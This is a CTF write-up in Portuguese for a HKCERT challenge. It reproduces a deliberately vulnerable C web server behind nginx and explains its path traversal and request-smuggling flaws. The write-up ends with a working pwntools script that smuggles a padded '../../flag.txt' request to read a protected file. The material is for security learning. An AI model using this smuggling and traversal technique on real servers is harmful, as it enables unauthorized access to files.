# Entrega 10/04
###### Solved by @Cubano2
> This is a CTF about path traversal and HTTP smugling  

## About the Challenge  
Somos apresentados a uma página WEB que devemos rodar localmente na nossa porta 8081 e descobrir como achar a flag nessa página.  

## Solution  
```C
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

#define PORT 8000
#define BUFFER_SIZE 1024

typedef struct {
    char *content;
    int size;
} FileWithSize;

bool ends_with(char *text, char *suffix) {
    int text_length = strlen(text);
    int suffix_length = strlen(suffix);

    return text_length >= suffix_length && \
           strncmp(text+text_length-suffix_length, suffix, suffix_length) == 0;
}

FileWithSize *read_file(char *filename) {
    if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) return NULL;

    char real_path[BUFFER_SIZE];
    snprintf(real_path, sizeof(real_path), "public/%s", filename);

    FILE *fd = fopen(real_path, "r");
    if (!fd) return NULL;

    fseek(fd, 0, SEEK_END);
    long filesize = ftell(fd);
    fseek(fd, 0, SEEK_SET);

    char *content = malloc(filesize + 1);
    if (!content) return NULL;

    fread(content, 1, filesize, fd);
    content[filesize] = '\0';

    fclose(fd);

    FileWithSize *file = malloc(sizeof(FileWithSize));
    file->content = content;
    file->size = filesize;
 
    return file;
}

void build_response(int socket_id, int status_code, char* status_description, FileWithSize *file) {
    char *response_body_fmt = 
        "HTTP/1.1 %u %s\r\n"
        "Server: mystiz-web/1.0.0\r\n"
        "Content-Type: text/html\r\n"
        "Connection: %s\r\n"
        "Content-Length: %u\r\n"
        "\r\n";
    char response_body[BUFFER_SIZE];

    sprintf(response_body,
            response_body_fmt,
            status_code,
            status_description,
            status_code == 200 ? "keep-alive" : "close",
            file->size);
    write(socket_id, response_body, strlen(response_body));
    write(socket_id, file->content, file->size);
    free(file->content);
    free(file);
    return;
}

void handle_client(int socket_id) {
    char buffer[BUFFER_SIZE];
    char requested_filename[BUFFER_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(requested_filename, 0, sizeof(requested_filename));

        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;

        if (sscanf(buffer, "GET /%s", requested_filename) != 1)
            return build_response(socket_id, 500, "Internal Server Error", read_file("500.html"));

        FileWithSize *file = read_file(requested_filename);
        if (!file)
            return build_response(socket_id, 404, "Not Found", read_file("404.html"));

        build_response(socket_id, 200, "OK", file);
    }
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    struct sockaddr_in server_address;
    struct sockaddr_in client_address;

    int socket_id = socket(AF_INET, SOCK_STREAM, 0);
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = htonl(INADDR_ANY);
    server_address.sin_port = htons(PORT);

    if (bind(socket_id, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) exit(1);
    if (listen(socket_id, 5) < 0) exit(1);

    while (1) {
        int client_address_len;
        int new_socket_id = accept(socket_id, (struct sockaddr *)&client_address, (socklen_t*)&client_address_len);
        if (new_socket_id < 0) exit(1);
        int pid = fork();
        if (pid == 0) {
            handle_client(new_socket_id);
            close(new_socket_id);
        }
    }
}
```
Neste código há 2 vulnerabilidades, path traveresal e HTTP SMUGLLING. Mas vamos por partes, no código a parte para checarmos que a vulnerabilidade de path traversal ocorre é nesse trecho do código
```c
snprintf(real_path, sizeof(real_path), "public/%s", filename);
```
Esse trecho do código une todos os caminhos possíveis que se pode acessar no site, porém ele não preve o caso de uma pessoa tentar pular diretórios com o ```../``` com isso a vulnerabilidade de path traversal pode ser aplicada.

Em uma análise mais profunda do código podemos enxergar uma parte 'estranha', bem no começo do código temos:
```c
#define BUFFER_SIZE 1024
```
Que faz todos os buffers do código terem um tamanho fixo, porém eles também não são tratados para caso eles sejam maiores que o esperado, com isso o seguinte trecho:
```c
sscanf(buffer, "GET /%s", requested_filename)
```
Por conta disso, o trecho não tem um limite de tamanho para as requisições GET.

E a última parte importante do código do servidor é: 
```c
if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) 
    return NULL;
```
Que faz o servidor só aceitar requisição que termina com ```.html```, ```.png```, ```.css```, ```.js```.

Com isso abri o BurpSuite e capturei a requisição para entrar no ```localhost:8081/index.html``` e troquei a requisição para ```GET /../../../../flag.txt.js``` e recebemos
```
HTTP/1.1 400 Bad Request
Server: nginx/1.27.1
Date: Fri, 04 Apr 2025 20:06:45 GMT
Content-Type: text/html
Content-Length: 157
Connection: close

<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx/1.27.1</center>
</body>
</html>
```
E fiquei preso nessa parte achando que o exercício era somente de path traversal, porém conversei com um amigo que me ajudou bastante a partir de agora, ele me falou para abrir o arquivo ```nginx.conf``` por conta que na requisição ali no final aparece o ```nginx```
```
user www-data;

thread_pool default threads=1 max_queue=65536;

events {
    worker_connections 1024;
}

http {
    upstream backend {
        server web:8000;
        keepalive 32;
    }

    server {
        listen 80;
        server_name proxy;

        location / {
            proxy_pass http://backend;
            proxy_set_header Host $host;
        }
    }
}
```
E assim descobri que esse desafio além de path traversal também contém HTTP SMUGGLING e precisamos mandar uma requisição oculta para entrarmos na porta 8000 onde possivelmente está a flag. Lembrando que a página WEB está na porta 8081.
E podemos entender que o HTTP SMUGGLING pode acontecer nesse código por conta desse ```while``` dentro da função ```void handle_client```:
```c
 while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(requested_filename, 0, sizeof(requested_filename));

        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;

        if (sscanf(buffer, "GET /%s", requested_filename) != 1)
            return build_response(socket_id, 500, "Internal Server Error", read_file("500.html"));

        FileWithSize *file = read_file(requested_filename);
        if (!file)
            return build_response(socket_id, 404, "Not Found", read_file("404.html"));

        build_response(socket_id, 200, "OK", file);
    }
```
E o que esse while faz para ter a vulnerabilidade citada acima é que ele não se encerra quando uma requisição chega. Assim possibilitando que o smuggling acontece, pois tem como "esconder" outra requisição.

Colocando as duas requisições, a que vai pra porta 8081 como principal, e escondida nessa uma requisição que vá para a porta 8000 em um script, eventualmente chegaremos na flag:
```python
from pwn import *

def pad(path):
    assert len(path) <= 1016
    prefix = '/' * (1016 - len(path))  
    suffix = '.js'  
    return prefix + path + suffix

r = remote('localhost', 8081)  

path = pad('../../flag.txt')  
payload = (
    'GET /index.html HTTP/1.1\r\n'
    'Content-Length: 1024\r\n'
    'Host: localhost\r\n'
    f'Foo: {"a"*931}\r\n'  
    '\r\n'

    # Requisição forjada
    f'GET /{path}'
    'GET /index.html HTTP/1.1\r\n'
    'Content-Length: 0\r\n'
    'Host: localhost\r\n'
    '\r\n'
)

print(f'payload: {payload}')
r.send(payload.encode())
```
![Imagem do WhatsApp de 2025-04-10 à(s) 09 02 26_3d187b87](https://github.com/user-attachments/assets/e7948d07-6af9-4ec0-a2a8-40017e32b418)


>`hkcert24{***REDACTED***}`
